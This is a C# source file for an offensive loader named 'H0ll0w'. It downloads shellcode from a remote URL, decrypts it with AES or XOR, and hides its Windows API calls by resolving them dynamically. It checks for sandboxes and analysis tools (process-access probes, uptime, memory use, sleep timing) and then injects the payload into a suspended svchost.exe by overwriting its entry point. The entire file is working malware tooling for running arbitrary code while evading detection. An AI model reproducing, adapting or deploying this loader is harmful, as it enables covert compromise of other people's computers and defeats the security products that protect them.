using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace H0ll0w {
class Program {
    public const uint CREATE_SUSPENDED = 0x4;
    public const int ProcessBasicInformation = 0;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    internal struct STARTUPINFO {
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }

    [StructLayout(LayoutKind.Sequential, Size = 40)]
    public struct PROCESS_MEMORY_COUNTERS {
        public uint cb;
        public uint PageFaultCount;
        public uint PeakWorkingSetSize;
        public uint WorkingSetSize;
        public uint QuotaPeakPagedPoolUsage;
        public uint QuotaPagedPoolUsage;
        public uint QuotaPeakNonPagedPoolUsage;
        public uint QuotaNonPagedPoolUsage;
        public uint PagefileUsage;
        public uint PeakPagefileUsage;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING {
        public UInt16 Length;
        public UInt16 MaximumLength;
        public IntPtr Buffer;
    }
    public enum NtStatus : uint {
        // Success
        Success = 0x00000000,
        Wait0 = 0x00000000,
        Wait1 = 0x00000001,
        Wait2 = 0x00000002,
        Wait3 = 0x00000003,
        Wait63 = 0x0000003f,
        Abandoned = 0x00000080,
        AbandonedWait0 = 0x00000080,
        AbandonedWait1 = 0x00000081,
        AbandonedWait2 = 0x00000082,
        AbandonedWait3 = 0x00000083,
        AbandonedWait63 = 0x000000bf,
        UserApc = 0x000000c0,
        KernelApc = 0x00000100,
        Alerted = 0x00000101,
        Timeout = 0x00000102,
        Pending = 0x00000103,
        Reparse = 0x00000104,
        MoreEntries = 0x00000105,
        NotAllAssigned = 0x00000106,
        SomeNotMapped = 0x00000107,
        OpLockBreakInProgress = 0x00000108,
        VolumeMounted = 0x00000109,
        RxActCommitted = 0x0000010a,
        NotifyCleanup = 0x0000010b,
        NotifyEnumDir = 0x0000010c,
        NoQuotasForAccount = 0x0000010d,
        PrimaryTransportConnectFailed = 0x0000010e,
        PageFaultTransition = 0x00000110,
        PageFaultDemandZero = 0x00000111,
        PageFaultCopyOnWrite = 0x00000112,
        PageFaultGuardPage = 0x00000113,
        PageFaultPagingFile = 0x00000114,
        CrashDump = 0x00000116,
        ReparseObject = 0x00000118,
        NothingToTerminate = 0x00000122,
        ProcessNotInJob = 0x00000123,
        ProcessInJob = 0x00000124,
        ProcessCloned = 0x00000129,
        FileLockedWithOnlyReaders = 0x0000012a,
        FileLockedWithWriters = 0x0000012b,
        Informational = 0x40000000,
        ObjectNameExists = 0x40000000,
        ThreadWasSuspended = 0x40000001,
        WorkingSetLimitRange = 0x40000002,
        ImageNotAtBase = 0x40000003,
        RegistryRecovered = 0x40000009,
        Warning = 0x80000000,
        GuardPageViolation = 0x80000001,
        DatatypeMisalignment = 0x80000002,
        Breakpoint = 0x80000003,
        SingleStep = 0x80000004,
        BufferOverflow = 0x80000005,
        NoMoreFiles = 0x80000006,
        HandlesClosed = 0x8000000a,
        PartialCopy = 0x8000000d,
        DeviceBusy = 0x80000011,
        InvalidEaName = 0x80000013,
        EaListInconsistent = 0x80000014,
        NoMoreEntries = 0x8000001a,
        LongJump = 0x80000026,
        DllMightBeInsecure = 0x8000002b,
        Error = 0xc0000000,
        Unsuccessful = 0xc0000001,
        NotImplemented = 0xc0000002,
        InvalidInfoClass = 0xc0000003,
        InfoLengthMismatch = 0xc0000004,
        AccessViolation = 0xc0000005,
        InPageError = 0xc0000006,
        PagefileQuota = 0xc0000007,
        InvalidHandle = 0xc0000008,
        BadInitialStack = 0xc0000009,
        BadInitialPc = 0xc000000a,
        InvalidCid = 0xc000000b,
        TimerNotCanceled = 0xc000000c,
        InvalidParameter = 0xc000000d,
        NoSuchDevice = 0xc000000e,
        NoSuchFile = 0xc000000f,
        InvalidDeviceRequest = 0xc0000010,
        EndOfFile = 0xc0000011,
        WrongVolume = 0xc0000012,
        NoMediaInDevice = 0xc0000013,
        NoMemory = 0xc0000017,
        NotMappedView = 0xc0000019,
        UnableToFreeVm = 0xc000001a,
        UnableToDeleteSection = 0xc000001b,
        IllegalInstruction = 0xc000001d,
        AlreadyCommitted = 0xc0000021,
        AccessDenied = 0xc0000022,
        BufferTooSmall = 0xc0000023,
        ObjectTypeMismatch = 0xc0000024,
        NonContinuableException = 0xc0000025,
        BadStack = 0xc0000028,
        NotLocked = 0xc000002a,
        NotCommitted = 0xc000002d,
        InvalidParameterMix = 0xc0000030,
        ObjectNameInvalid = 0xc0000033,
        ObjectNameNotFound = 0xc0000034,
        ObjectNameCollision = 0xc0000035,
        ObjectPathInvalid = 0xc0000039,
        ObjectPathNotFound = 0xc000003a,
        ObjectPathSyntaxBad = 0xc000003b,
        DataOverrun = 0xc000003c,
        DataLate = 0xc000003d,
        DataError = 0xc000003e,
        CrcError = 0xc000003f,
        SectionTooBig = 0xc0000040,
        PortConnectionRefused = 0xc0000041,
        InvalidPortHandle = 0xc0000042,
        SharingViolation = 0xc0000043,
        QuotaExceeded = 0xc0000044,
        InvalidPageProtection = 0xc0000045,
        MutantNotOwned = 0xc0000046,
        SemaphoreLimitExceeded = 0xc0000047,
        PortAlreadySet = 0xc0000048,
        SectionNotImage = 0xc0000049,
        SuspendCountExceeded = 0xc000004a,
        ThreadIsTerminating = 0xc000004b,
        BadWorkingSetLimit = 0xc000004c,
        IncompatibleFileMap = 0xc000004d,
        SectionProtection = 0xc000004e,
        EasNotSupported = 0xc000004f,
        EaTooLarge = 0xc0000050,
        NonExistentEaEntry = 0xc0000051,
        NoEasOnFile = 0xc0000052,
        EaCorruptError = 0xc0000053,
        FileLockConflict = 0xc0000054,
        LockNotGranted = 0xc0000055,
        DeletePending = 0xc0000056,
        CtlFileNotSupported = 0xc0000057,
        UnknownRevision = 0xc0000058,
        RevisionMismatch = 0xc0000059,
        InvalidOwner = 0xc000005a,
        InvalidPrimaryGroup = 0xc000005b,
        NoImpersonationToken = 0xc000005c,
        CantDisableMandatory = 0xc000005d,
        NoLogonServers = 0xc000005e,
        NoSuchLogonSession = 0xc000005f,
        NoSuchPrivilege = 0xc0000060,
        PrivilegeNotHeld = 0xc0000061,
        InvalidAccountName = 0xc0000062,
        UserExists = 0xc0000063,
        NoSuchUser = 0xc0000064,
        GroupExists = 0xc0000065,
        NoSuchGroup = 0xc0000066,
        MemberInGroup = 0xc0000067,
        MemberNotInGroup = 0xc0000068,
        LastAdmin = 0xc0000069,
        WrongPassword = 0xc000006a,
        IllFormedPassword = 0xc000006b,
        PasswordRestriction = 0xc000006c,
        LogonFailure = 0xc000006d,
        AccountRestriction = 0xc000006e,
        InvalidLogonHours = 0xc000006f,
        InvalidWorkstation = 0xc0000070,
        PasswordExpired = 0xc0000071,
        AccountDisabled = 0xc0000072,
        NoneMapped = 0xc0000073,
        TooManyLuidsRequested = 0xc0000074,
        LuidsExhausted = 0xc0000075,
        InvalidSubAuthority = 0xc0000076,
        InvalidAcl = 0xc0000077,
        InvalidSid = 0xc0000078,
        InvalidSecurityDescr = 0xc0000079,
        ProcedureNotFound = 0xc000007a,
        InvalidImageFormat = 0xc000007b,
        NoToken = 0xc000007c,
        BadInheritanceAcl = 0xc000007d,
        RangeNotLocked = 0xc000007e,
        DiskFull = 0xc000007f,
        ServerDisabled = 0xc0000080,
        ServerNotDisabled = 0xc0000081,
        TooManyGuidsRequested = 0xc0000082,
        GuidsExhausted = 0xc0000083,
        InvalidIdAuthority = 0xc0000084,
        AgentsExhausted = 0xc0000085,
        InvalidVolumeLabel = 0xc0000086,
        SectionNotExtended = 0xc0000087,
        NotMappedData = 0xc0000088,
        ResourceDataNotFound = 0xc0000089,
        ResourceTypeNotFound = 0xc000008a,
        ResourceNameNotFound = 0xc000008b,
        ArrayBoundsExceeded = 0xc000008c,
        FloatDenormalOperand = 0xc000008d,
        FloatDivideByZero = 0xc000008e,
        FloatInexactResult = 0xc000008f,
        FloatInvalidOperation = 0xc0000090,
        FloatOverflow = 0xc0000091,
        FloatStackCheck = 0xc0000092,
        FloatUnderflow = 0xc0000093,
        IntegerDivideByZero = 0xc0000094,
        IntegerOverflow = 0xc0000095,
        PrivilegedInstruction = 0xc0000096,
        TooManyPagingFiles = 0xc0000097,
        FileInvalid = 0xc0000098,
        InstanceNotAvailable = 0xc00000ab,
        PipeNotAvailable = 0xc00000ac,
        InvalidPipeState = 0xc00000ad,
        PipeBusy = 0xc00000ae,
        IllegalFunction = 0xc00000af,
        PipeDisconnected = 0xc00000b0,
        PipeClosing = 0xc00000b1,
        PipeConnected = 0xc00000b2,
        PipeListening = 0xc00000b3,
        InvalidReadMode = 0xc00000b4,
        IoTimeout = 0xc00000b5,
        FileForcedClosed = 0xc00000b6,
        ProfilingNotStarted = 0xc00000b7,
        ProfilingNotStopped = 0xc00000b8,
        NotSameDevice = 0xc00000d4,
        FileRenamed = 0xc00000d5,
        CantWait = 0xc00000d8,
        PipeEmpty = 0xc00000d9,
        CantTerminateSelf = 0xc00000db,
        InternalError = 0xc00000e5,
        InvalidParameter1 = 0xc00000ef,
        InvalidParameter2 = 0xc00000f0,
        InvalidParameter3 = 0xc00000f1,
        InvalidParameter4 = 0xc00000f2,
        InvalidParameter5 = 0xc00000f3,
        InvalidParameter6 = 0xc00000f4,
        InvalidParameter7 = 0xc00000f5,
        InvalidParameter8 = 0xc00000f6,
        InvalidParameter9 = 0xc00000f7,
        InvalidParameter10 = 0xc00000f8,
        InvalidParameter11 = 0xc00000f9,
        InvalidParameter12 = 0xc00000fa,
        MappedFileSizeZero = 0xc000011e,
        TooManyOpenedFiles = 0xc000011f,
        Cancelled = 0xc0000120,
        CannotDelete = 0xc0000121,
        InvalidComputerName = 0xc0000122,
        FileDeleted = 0xc0000123,
        SpecialAccount = 0xc0000124,
        SpecialGroup = 0xc0000125,
        SpecialUser = 0xc0000126,
        MembersPrimaryGroup = 0xc0000127,
        FileClosed = 0xc0000128,
        TooManyThreads = 0xc0000129,
        ThreadNotInProcess = 0xc000012a,
        TokenAlreadyInUse = 0xc000012b,
        PagefileQuotaExceeded = 0xc000012c,
        CommitmentLimit = 0xc000012d,
        InvalidImageLeFormat = 0xc000012e,
        InvalidImageNotMz = 0xc000012f,
        InvalidImageProtect = 0xc0000130,
        InvalidImageWin16 = 0xc0000131,
        LogonServer = 0xc0000132,
        DifferenceAtDc = 0xc0000133,
        SynchronizationRequired = 0xc0000134,
        DllNotFound = 0xc0000135,
        IoPrivilegeFailed = 0xc0000137,
        OrdinalNotFound = 0xc0000138,
        EntryPointNotFound = 0xc0000139,
        ControlCExit = 0xc000013a,
        PortNotSet = 0xc0000353,
        DebuggerInactive = 0xc0000354,
        CallbackBypass = 0xc0000503,
        PortClosed = 0xc0000700,
        MessageLost = 0xc0000701,
        InvalidMessage = 0xc0000702,
        RequestCanceled = 0xc0000703,
        RecursiveDispatch = 0xc0000704,
        LpcReceiveBufferExpected = 0xc0000705,
        LpcInvalidConnectionUsage = 0xc0000706,
        LpcRequestsNotAllowed = 0xc0000707,
        ResourceInUse = 0xc0000708,
        ProcessIsProtected = 0xc0000712,
        VolumeDirty = 0xc0000806,
        FileCheckedOut = 0xc0000901,
        CheckOutRequired = 0xc0000902,
        BadFileType = 0xc0000903,
        FileTooLarge = 0xc0000904,
        FormsAuthRequired = 0xc0000905,
        VirusInfected = 0xc0000906,
        VirusDeleted = 0xc0000907,
        TransactionalConflict = 0xc0190001,
        InvalidTransaction = 0xc0190002,
        TransactionNotActive = 0xc0190003,
        TmInitializationFailed = 0xc0190004,
        RmNotActive = 0xc0190005,
        RmMetadataCorrupt = 0xc0190006,
        TransactionNotJoined = 0xc0190007,
        DirectoryNotRm = 0xc0190008,
        CouldNotResizeLog = 0xc0190009,
        TransactionsUnsupportedRemote = 0xc019000a,
        LogResizeInvalidSize = 0xc019000b,
        RemoteFileVersionMismatch = 0xc019000c,
        CrmProtocolAlreadyExists = 0xc019000f,
        TransactionPropagationFailed = 0xc0190010,
        CrmProtocolNotFound = 0xc0190011,
        TransactionSuperiorExists = 0xc0190012,
        TransactionRequestNotValid = 0xc0190013,
        TransactionNotRequested = 0xc0190014,
        TransactionAlreadyAborted = 0xc0190015,
        TransactionAlreadyCommitted = 0xc0190016,
        TransactionInvalidMarshallBuffer = 0xc0190017,
        CurrentTransactionNotValid = 0xc0190018,
        LogGrowthFailed = 0xc0190019,
        ObjectNoLongerExists = 0xc0190021,
        StreamMiniversionNotFound = 0xc0190022,
        StreamMiniversionNotValid = 0xc0190023,
        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
        CantOpenMiniversionWithModifyIntent = 0xc0190025,
        CantCreateMoreStreamMiniversions = 0xc0190026,
        HandleNoLongerValid = 0xc0190028,
        NoTxfMetadata = 0xc0190029,
        LogCorruptionDetected = 0xc0190030,
        CantRecoverWithHandleOpen = 0xc0190031,
        RmDisconnected = 0xc0190032,
        EnlistmentNotSuperior = 0xc0190033,
        RecoveryNotNeeded = 0xc0190034,
        RmAlreadyStarted = 0xc0190035,
        FileIdentityNotPersistent = 0xc0190036,
        CantBreakTransactionalDependency = 0xc0190037,
        CantCrossRmBoundary = 0xc0190038,
        TxfDirNotEmpty = 0xc0190039,
        IndoubtTransactionsExist = 0xc019003a,
        TmVolatile = 0xc019003b,
        RollbackTimerExpired = 0xc019003c,
        TxfAttributeCorrupt = 0xc019003d,
        EfsNotAllowedInTransaction = 0xc019003e,
        TransactionalOpenNotAllowed = 0xc019003f,
        TransactedMappingUnsupportedRemote = 0xc0190040,
        TxfMetadataAlreadyPresent = 0xc0190041,
        TransactionScopeCallbacksNotSet = 0xc0190042,
        TransactionRequiredPromotion = 0xc0190043,
        CannotExecuteFileInTransaction = 0xc0190044,
        TransactionsNotFrozen = 0xc0190045,
        MaximumNtStatus = 0xffffffff
    }

    public class arg {
        public string enctype;
        public string url;
        public string key;
        public byte[] buf;

        public arg(string[] __args)
        {
            for (int i = 0; i < __args.Length; i++) {
                switch (__args[i]) {
                case "-e":
                    enctype = __args[i + 1];
                    i++;
                    break;
                case "-u":
                    url = __args[i + 1];
                    i++;
                    break;
                case "-k":
                    key = __args[i + 1];
                    i++;
                    break;
                default:
                    throw new ArgumentException($"[!] Invalid argument: \"{__args[i]}\" !");
                }
            }
            //Console.WriteLine($"Enctype:{enctype}\nUrl:{url}\nKey:{key}");
            if (url == null)
                throw new Exception("[!] Missing url !");
            if (enctype != "none" && enctype != "AES" && enctype != "xor")
                throw new Exception("[!] Invalid encryption type! must be xor, AES or none.");
            if (key == null && enctype != "none")
                throw new Exception("[!] Decryption key missing!");
        }

        private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using(var ms = new MemoryStream()) using(var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        public void init()
        {
            WebClient client = new WebClient();
            client.Proxy = WebRequest.GetSystemWebProxy();
            client.Proxy.Credentials = CredentialCache.DefaultCredentials;
            byte[] tmp = client.DownloadData(url);
            Console.WriteLine("[+] Getting shellcode");
            if (tmp == null)
                throw new Exception("[!] Url is empty!");

            if (enctype == "AES") {
                using(Aes __aes = Aes.Create())
                {
                    __aes.Key = System.Text.Encoding.UTF8.GetBytes(key);
                    __aes.IV = Enumerable.Repeat((byte) 0x00, 100).ToArray();
                    using(var decryptor = __aes.CreateDecryptor(__aes.Key, __aes.IV))
                    {
                        buf = PerformCryptography(tmp, decryptor);
                    }
                }

            }

            else if (enctype == "xor") {
                buf = tmp;
                for (int i = 0; i < buf.Length; i++) {
                    buf[i] = (byte)((buf[i] ^ (byte) key[i % key.Length]) & 0xFF);
                }
            }
            Console.WriteLine($"buf len: {buf.Length}");
        }
    }

    public class Generic {
        public static NtStatus LdrLoadDll(IntPtr PathToFile,
            UInt32 dwFlags,
            ref UNICODE_STRING ModuleFileName,
            ref IntPtr ModuleHandle)
        {
            object[] funcargs = { PathToFile, dwFlags, ModuleFileName, ModuleHandle };

            NtStatus retValue = (NtStatus) DynamicAPIInvoke(
                @"ntdll.dll", @"LdrLoadDll", typeof(LdrLoadDll), ref funcargs);
            ModuleHandle = (IntPtr) funcargs[3];

            return retValue;
        }
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules) {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower())) {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }

        public static void RtlInitUnicodeString(
            ref UNICODE_STRING DestinationString,
            [ MarshalAs(UnmanagedType.LPWStr) ] string SourceString)
        {
            // Craft an array for the arguments
            object[] funcargs = { DestinationString, SourceString };

            DynamicAPIInvoke(@"ntdll.dll",
                @"RtlInitUnicodeString",
                typeof(RtlInitUnicodeString),
                ref funcargs);

            DestinationString = (UNICODE_STRING) funcargs[0];
        }

        public static IntPtr LoadModuleFromDisk(string DLLPath)
        {
            UNICODE_STRING uModuleName = new UNICODE_STRING();
            RtlInitUnicodeString(ref uModuleName, DLLPath);

            IntPtr hModule = IntPtr.Zero;
            NtStatus CallResult = LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
            if (CallResult != NtStatus.Success || hModule == IntPtr.Zero) {
                return IntPtr.Zero;
            }

            return hModule;
        }

        public static object DynamicAPIInvoke(string DLLName,
            string FunctionName,
            Type FunctionDelegateType,
            ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(
                pFunction, FunctionDelegateType, ref Parameters);
        }

        public static object DynamicFunctionInvoke(IntPtr FunctionPointer,
            Type FunctionDelegateType,
            ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(
                FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }

        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try {
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr) OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b) {
                    pExport = OptHeader + 0x60;
                } else {
                    pExport = OptHeader + 0x70;
                }

                Int32 ExportRVA = Marshal.ReadInt32((IntPtr) pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                for (int i = 0; i < NumberOfNames; i++) {
                    string FunctionName = Marshal.PtrToStringAnsi(
                        (IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName,
                            StringComparison.OrdinalIgnoreCase)) {
                        Int32 FunctionOrdinal = Marshal.ReadInt16(
                                                    (IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2))
                            + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32(
                            (IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64) ModuleBase + FunctionRVA);
                        break;
                    }
                }
            } catch {
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero) {
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }

        public static IntPtr GetLibraryAddress(string DLLName,
            string FunctionName,
            bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero && CanLoadFromDisk) {
                hModule = LoadModuleFromDisk(DLLName);
                if (hModule == IntPtr.Zero) {
                    throw new FileNotFoundException(
                        DLLName + ", unable to find the specified file.");
                }
            } else if (hModule == IntPtr.Zero) {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }
    }

    static void Main(string[] args)
    {
        if (args.Length < 4 || args.Length > 6) {
            Console.WriteLine("[!] Usage: ./H0ll -u https://IP:PORT/file.bin -e [ENCRYPTION TYPE (AES or XOR)] -k [KEY]");
            return;
        }
        arg __arg;
        try {
            __arg = new arg(args);
            __arg.init();
        } catch (Exception e) {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(e.Message);
            Console.ResetColor();
            return;
        }

        // __arg.buf = "INSERT SHELLCODE HERE IF YOU DONT WANT TO DOWNLOAD IT FROM A URL";

        var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
        OpenProcess opr = Marshal.GetDelegateForFunctionPointer(
            pointer, typeof(OpenProcess)) as OpenProcess;

        IntPtr sysproc = opr(0x001F0FFF, false, 4);
        if (sysproc != IntPtr.Zero) {
            return;
        }
        Int32 up = Environment.TickCount;
        if (up < 300000) {
            return;
        }
        int c = 0;
        for (long i = 900000001; i > 0; i--)
            c++;
        pointer = Generic.GetLibraryAddress("psapi.dll", "GetProcessMemoryInfo");
        GetProcessMemoryInfo gpmi = Marshal.GetDelegateForFunctionPointer(
            pointer, typeof(GetProcessMemoryInfo)) as GetProcessMemoryInfo;

        pointer = Generic.GetLibraryAddress("kernel32.dll", "GetCurrentProcess");
        GetCurrentProcess gcp = Marshal.GetDelegateForFunctionPointer(
            pointer, typeof(GetCurrentProcess)) as GetCurrentProcess;

        PROCESS_MEMORY_COUNTERS pmc;
        pmc.cb = (uint) Marshal.SizeOf(typeof(PROCESS_MEMORY_COUNTERS));
        gpmi(gcp(), out pmc, pmc.cb);
        if (pmc.WorkingSetSize >= 3500000) {
            return;
        }

        pointer = Generic.GetLibraryAddress("kernel32.dll", "VirtualAllocExNuma");
        VirtualAllocExNuma vaen = Marshal.GetDelegateForFunctionPointer(
            pointer, typeof(VirtualAllocExNuma)) as VirtualAllocExNuma;

        IntPtr mem = vaen(gcp(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null) {
            return;
        }

        var rand = new Random();
        uint dream = (uint) rand.Next(10000, 20000);
        double delta = dream / 1000 - 0.5;
        DateTime before = DateTime.Now;
        Sleep(dream);
        if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            return;

        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        pointer = Generic.GetLibraryAddress("kernel32.dll", "CreateProcessA");
        CreateProcessA __c = Marshal.GetDelegateForFunctionPointer(
            pointer, typeof(CreateProcessA)) as CreateProcessA;

        bool cResult = __c(null,
            "c:\\windows\\system32\\svchost.exe",
            IntPtr.Zero,
            IntPtr.Zero,
            false,
            CREATE_SUSPENDED,
            IntPtr.Zero,
            null,
            ref si,
            out pi);

        PROCESS_BASIC_INFORMATION __pbi = new PROCESS_BASIC_INFORMATION();
        uint ret = new uint();

        pointer = Generic.GetLibraryAddress("ntdll.dll", "ZwQueryInformationProcess");
        ZwQueryInformationProcess zqip = Marshal.GetDelegateForFunctionPointer(
            pointer, typeof(ZwQueryInformationProcess)) as ZwQueryInformationProcess;

        long qResult = zqip(pi.hProcess,
            ProcessBasicInformation,
            ref __pbi,
            (uint)(IntPtr.Size * 6),
            ref ret);
        IntPtr baseImageAddr = (IntPtr)((Int64) __pbi.PebAddress + 0x10);

        byte[] baseAddressBytes = new byte[IntPtr.Size];
        byte[] dBuff = new byte[0x200];
        IntPtr nRead = IntPtr.Zero;
        pointer = Generic.GetLibraryAddress("kernel32.dll", "ReadProcessMemory");
        ReadProcessMemory __Rpm = Marshal.GetDelegateForFunctionPointer(
            pointer, typeof(ReadProcessMemory)) as ReadProcessMemory;
        bool __res = __Rpm(pi.hProcess,
            baseImageAddr,
            baseAddressBytes,
            baseAddressBytes.Length,
            out nRead);
        IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));
        __res = __Rpm(pi.hProcess, imageBaseAddress, dBuff, dBuff.Length, out nRead);
        uint e_lfanew = BitConverter.ToUInt32(dBuff, 0x3c);
        uint entrypointRvaOffset = e_lfanew + 0x28;
        uint entrypointRva = BitConverter.ToUInt32(dBuff, (int) entrypointRvaOffset);
        IntPtr entrypointAddress = (IntPtr)((UInt64) imageBaseAddress + entrypointRva);

        pointer = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
        WriteProcessMemory wpm = Marshal.GetDelegateForFunctionPointer(
            pointer, typeof(WriteProcessMemory)) as WriteProcessMemory;

        __res = wpm(pi.hProcess, entrypointAddress, __arg.buf, (uint) __arg.buf.Length, out nRead);
        Console.WriteLine("[+] Entrypoint overwritten !");

        pointer = Generic.GetLibraryAddress("kernel32.dll", "ResumeThread");
        ResumeThread rt = Marshal.GetDelegateForFunctionPointer(
            pointer, typeof(ResumeThread)) as ResumeThread;

        uint rResult;
        if ((rResult = rt(pi.hThread)) == 0) {
            Console.WriteLine("[!] Failure.");
            return;
        }

        Console.WriteLine("[+] Success.");
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate IntPtr
    OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool
    CreateProcessA(string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [ In ] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr
    VirtualAllocEx(IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool
    WriteProcessMemory(IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out IntPtr lpNumberOfBytesWritten);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr
    CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint
    ResumeThread(IntPtr hThread);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr
    VirtualAllocExNuma(IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect,
        UInt32 nndPreferred);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int
    ZwQueryInformationProcess(IntPtr hProcess,
        int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen,
        ref uint retlen);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool
    ReadProcessMemory(IntPtr hProcess,
        IntPtr lpBaseAddress,
        [ Out ] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfbytesRW);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr
    GetCurrentProcess();

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool
    GetProcessMemoryInfo(IntPtr hProcess,
        out PROCESS_MEMORY_COUNTERS counters,
        uint size);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32
    LdrLoadDll(IntPtr PathToFile,
        UInt32 dwFlags,
        ref UNICODE_STRING ModuleFileName,
        ref IntPtr ModuleHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void
    RtlInitUnicodeString(ref UNICODE_STRING DestinationString,
        [ MarshalAs(UnmanagedType.LPWStr) ] string SourceString);

    [DllImport("kernel32.dll")]
    static extern void
    Sleep(uint dwMilliseconds);
}
}
